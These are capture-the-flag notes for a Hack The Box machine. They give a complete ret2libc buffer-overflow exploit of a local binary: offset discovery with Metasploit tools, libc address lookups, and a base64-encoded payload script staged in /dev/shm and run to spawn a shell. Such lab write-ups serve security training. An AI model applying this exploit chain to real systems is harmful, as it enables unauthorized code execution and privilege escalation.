# Rop file from HTB Machine

```bash
#download rop file to local machine with meterpreter:
download rop

#make rop file executable:
chmod +x rop

#Start rop with debugger:
gdb rop

#create pattern:
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
pattern_create 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

#run pattern on rop file:
r 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'

#get offset from output
0x62413762

#calculate offset:
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413762

#offset is 52:
#generate filling 52 with python:
python -c 'print "A"*52'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA


#check randomized on target machine:
cat /proc/sys/kernel/randomize_va_space

#check architecture:
uname -a

#get libc address for rop on target machine:
ldd rop
0xb7e19000

#readelf libc file get system:
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -i system
0003ada0

#readelf libc file get exit:
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -i exit
0002e9d0

#get /bin/sh from libc:
strings -atx /lib/i386-linux-gnu/libc.so.6 | grep -i bin/sh
15ba0b


#Create exploit.py
vim exploit.py

#move script to target:
#Option 1 without metasploit:
#convert script to base64 encoded string:
cat exploit.py | base64 -w 0
aW1wb3J0IHN0cnVjdAoKanVuayA9ICJBIiAqIDUyCmxpYmMgPSAweGI3ZTE5MDAwCnN5c3RlbSA9IHN0cnVjdC5wYWNrKCc8SScsIGxpYmMgKyAweDAwMDNhZGEwKQpleGl0X2FkZHJlc3MgPSBzdHJ1Y3QucGFjaygnPEknLCBsaWJjICsgMHgwMDAyZTlkMCkKYmluc2ggPSBzdHJ1Y3QucGFjaygnPEknLCBsaWJjICsgMHgwMDE1YmEwYikKCnBheWxvYWQgPSBqdW5rICsgc3lzdGVtICsgZXhpdF9hZGRyZXNzICsgYmluc2gKCnByaW50IHBheWxvYWQK

#on target go to /dev/shm:
cd /dev/shm

#import script:
echo -n "base64" | base64 -d > exploit.py

#return to rop dir:
cd -

#run rop with exploit.py
./rop $(python /dev/shm/exploit.py)
```
